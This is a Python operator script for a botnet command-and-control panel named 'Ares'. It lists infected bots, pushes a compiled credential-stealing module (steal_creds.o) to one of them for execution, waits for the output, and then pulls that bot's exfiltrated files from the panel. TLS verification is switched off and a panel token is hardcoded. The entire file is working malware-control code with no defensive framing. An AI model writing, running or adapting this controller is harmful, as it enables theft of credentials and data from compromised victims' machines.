#!/usr/bin/env python3
import urllib.request, json, ssl, base64, time, os, sys

C2 = "https://127.0.0.1:443"
TOKEN = "ares_panel_token_2024_fixed"
COFF = r"C:\Users\Admin\.openclaw\workspace\Ares_Framework\build\steal_creds.o"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def api_get(path):
    req = urllib.request.Request(f"{C2}{path}",
        headers={"Authorization": f"Bearer {TOKEN}"})
    r = urllib.request.urlopen(req, context=ctx, timeout=10)
    return json.loads(r.read().decode())

def api_post(path, data):
    body = json.dumps(data).encode()
    req = urllib.request.Request(f"{C2}{path}", data=body,
        headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=10)
        return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        print(f"  HTTP {e.code}: {e.read().decode()[:300]}")
        return None

# 1. List bots
print("[1] Listing bots...")
try:
    data = api_get("/api/panel/bots")
    bots = data if isinstance(data, list) else data.get("bots", data)
    if isinstance(bots, dict):
        bot_ids = list(bots.keys())
        print(f"  Found {len(bot_ids)} bots")
        for bid in bot_ids[:5]:
            b = bots[bid]
            ls = str(b.get("last_seen", "?"))[:19]
            st = b.get("status", "?")
            host = b.get("hostname") or b.get("host") or "?"
            print(f"  - {bid}: host={host} status={st} last={ls}")
    elif isinstance(bots, list):
        bot_ids = [b.get("id") or b.get("bot_id") for b in bots]
        print(f"  Found {len(bot_ids)} bots: {bot_ids[:3]}")
    else:
        print(f"  Raw: {str(data)[:300]}")
        bot_ids = []
except Exception as e:
    print(f"  ERR: {e}")
    sys.exit(1)

if not bot_ids:
    print("\n[!] No bots. Run ares_prod.exe first.")
    sys.exit(0)

bot_id = bot_ids[0]
print(f"\n[+] Target: {bot_id}")

# 2. Queue COFF exec
print(f"\n[2] Queue steal_creds.o...")
with open(COFF, "rb") as f:
    coff_b64 = base64.b64encode(f.read()).decode()
print(f"  COFF: {os.path.getsize(COFF)//1024}KB")

r = api_post("/api/panel/task", {"bot_id": bot_id, "type": "exec", "data": coff_b64})
if not r:
    sys.exit(1)
task_id = r.get("task_id") or r.get("id") or str(r)
print(f"  [+] Task: {task_id}")

# 3. Wait for result
print(f"\n[3] Waiting (up to 2min)...")
for i in range(24):
    time.sleep(5)
    try:
        results = api_get(f"/api/panel/results/{bot_id}")
        r_list = results if isinstance(results, list) else results.get("results", [])
        matched = [x for x in r_list if str(x.get("task_id","")) == str(task_id)]
        if matched:
            res = matched[0]
            out = res.get("output") or res.get("data") or ""
            print(f"\n  [+] RESULT! success={res.get('success')}")
            print(f"  Output: {out[:500]}")
            break
        recent = sorted(r_list, key=lambda x: x.get("created_at",""), reverse=True)[:1]
        print(f"  [{(i+1)*5}s] {len(r_list)} results total. Latest: {recent[0].get('task_id') if recent else 'none'}")
    except Exception as e:
        print(f"  [{(i+1)*5}s] {e}")
else:
    print("  [!] Timeout")

# 4. Exfil check
print(f"\n[4] Exfil for {bot_id}...")
try:
    data = api_get(f"/api/panel/data/{bot_id}")
    files = data if isinstance(data, list) else data.get("files", data.get("data", []))
    if isinstance(files, list):
        print(f"  Files: {len(files)}")
        for f in files[:5]: print(f"  - {f}")
    else:
        print(f"  {str(data)[:300]}")
except Exception as e:
    print(f"  ERR: {e}")
